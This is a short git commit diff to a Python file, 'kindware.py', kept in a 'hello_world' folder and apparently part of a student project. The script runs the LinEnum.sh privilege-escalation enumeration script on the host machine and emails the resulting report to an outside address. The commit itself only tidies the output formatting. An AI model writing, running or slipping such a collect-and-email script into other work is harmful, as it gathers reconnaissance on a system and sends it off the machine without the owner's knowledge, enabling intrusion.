a8fd128ddb555b99b025f4457f733bb72dbc67f8
Melvin Redondo--Tanis <melvin@redondotanis.com>
2026-03-27 16:00:55 +0100

    add kindware

--- hello_world/kindware.py
+++ hello_world/kindware.py
@@ -12,7 +12,10 @@ def execute_command():
     # Execute the script and capture the output
     execute_command = "./LinEnum.sh"
     result = subprocess.run(execute_command, shell=True, capture_output=True, text=True)
-    return result.stdout
+
+    # Ensure the output has proper line breaks
+    report = result.stdout.replace('\r', '')  # Remove carriage returns if any
+    return report
 
 def send_email(report, recipient_email):
     sender_email = "9534@holbertonstudents.com"
@@ -40,4 +43,3 @@ if __name__ == "__main__":
     report = execute_command()
     recipient_email = "9534@holbertonstudents.com"
     send_email(report, recipient_email)
-
